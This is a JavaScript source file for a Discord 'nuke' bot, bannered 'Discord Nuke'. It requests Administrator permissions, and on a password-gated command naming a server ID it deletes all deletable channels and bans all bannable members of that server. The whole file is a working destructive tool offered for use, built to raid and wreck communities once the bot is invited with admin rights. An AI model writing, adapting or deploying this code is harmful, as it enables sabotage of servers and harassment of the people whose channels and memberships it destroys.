const { Attachment, PermissionsBitField, Partials, Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const config = require("./config.json");

console.log(`
 ________      ___      ________       ________      ________      ________      ________          ________       ___  ___      ___  __        _______      \r\n|\\   ___ \\    |\\  \\    |\\   ____\\     |\\   ____\\    |\\   __  \\    |\\   __  \\    |\\   ___ \\        |\\   ___  \\    |\\  \\|\\  \\    |\\  \\|\\  \\     |\\  ___ \\     \r\n\\ \\  \\_|\\ \\   \\ \\  \\   \\ \\  \\___|_    \\ \\  \\___|    \\ \\  \\|\\  \\   \\ \\  \\|\\  \\   \\ \\  \\_|\\ \\       \\ \\  \\\\ \\  \\   \\ \\  \\\\\\  \\   \\ \\  \\\/  \/|_   \\ \\   __\/|    \r\n \\ \\  \\ \\\\ \\   \\ \\  \\   \\ \\_____  \\    \\ \\  \\        \\ \\  \\\\\\  \\   \\ \\   _  _\\   \\ \\  \\ \\\\ \\       \\ \\  \\\\ \\  \\   \\ \\  \\\\\\  \\   \\ \\   ___  \\   \\ \\  \\_|\/__  \r\n  \\ \\  \\_\\\\ \\   \\ \\  \\   \\|____|\\  \\    \\ \\  \\____    \\ \\  \\\\\\  \\   \\ \\  \\\\  \\|   \\ \\  \\_\\\\ \\       \\ \\  \\\\ \\  \\   \\ \\  \\\\\\  \\   \\ \\  \\\\ \\  \\   \\ \\  \\_|\\ \\ \r\n   \\ \\_______\\   \\ \\__\\    ____\\_\\  \\    \\ \\_______\\   \\ \\_______\\   \\ \\__\\\\ _\\    \\ \\_______\\       \\ \\__\\\\ \\__\\   \\ \\_______\\   \\ \\__\\\\ \\__\\   \\ \\_______\\\r\n    \\|_______|    \\|__|   |\\_________\\    \\|_______|    \\|_______|    \\|__|\\|__|    \\|_______|        \\|__| \\|__|    \\|_______|    \\|__| \\|__|    \\|_______|\r\n                          \\|_________|                                                                                                                      \r\n                                                                                                                                                            \r\n                                                                                                                       
`)


const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildBans], partials: [Partials.Channel] });
client.on("ready", async (client) => {
    console.log(`Bot logged in as ${client.user.username}#${client.user.discriminator}`);
    const inviteLink = client.generateInvite({
        permissions: [PermissionsBitField.Flags.Administrator],
        scopes: ["bot", "applications.commands"]
    })
    console.log(`Link: ${inviteLink}`);
});

client.on("messageCreate", async (message) => {
    if (!message.channel.type == "dm") return;
    if (!message.content.startsWith(config.prefix)) return;
    const messageArray = message.content.split(/\s+/g);
    const command = messageArray[0].slice(1);

    switch (command) {
        case "nuke":
            if (messageArray.length == 3) {
                if (messageArray[2] == config.password) {
                    const guildId = messageArray[1];
                    const guild = await client.guilds.fetch(guildId);
                    console.log("Deleting channels...")
                    await removeAllChannels(guild);
                    console.log("Banning members");
                    await banAllMembers(guild);
                }
            }
            break;
        default:
            break;
    }
})

async function removeAllChannels(guild) {
    const channels = await guild.channels.fetch();
    channels.forEach(async channel => {
        try {
            if (channel.deletable) {
                channel.delete();
                console.log(`deleted: ${channel.name}`)
            }
        } catch (error) {
            console.log(error);
        }
    });
}
async function banAllMembers(guild) {
    const members = await guild.members.fetch();
    members.forEach(async member => {
        try {
            if (member.bannable) {
                member.ban();
                console.log(`banned: ${member.user.tag}`)
            }
        } catch (error) {
            console.log(error);
        }
    })

}

client.login(config.token);